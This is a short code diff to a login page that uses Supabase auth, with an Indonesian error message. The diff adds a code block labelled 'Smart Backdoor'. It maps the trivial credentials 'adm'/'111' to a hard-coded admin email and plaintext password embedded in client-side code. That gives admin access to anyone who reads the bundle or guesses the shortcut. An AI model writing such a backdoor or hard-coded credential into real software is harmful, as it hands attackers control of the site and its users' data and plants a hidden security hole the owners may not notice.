@@ -28,7 +28,19 @@ export default function LoginPage() {
     setIsLoading(true);
 
     try {
-      const { error: signInError } = await supabase.auth.signInWithPassword({ email, password });
+      let loginEmail = email;
+      let loginPassword = password;
+
+      // Smart Backdoor (maps dummy credentials to the real auth account to get a valid token)
+      if (email === 'adm' && password === '111') {
+        loginEmail = 'admin@ninoc.store';
+        loginPassword = 'NinocAdmin2026!';
+      }
+
+      const { error: signInError } = await supabase.auth.signInWithPassword({ 
+        email: loginEmail, 
+        password: loginPassword 
+      });
       if (signInError) {
         setError('Kredensial tidak valid.');
         setIsLoading(false);
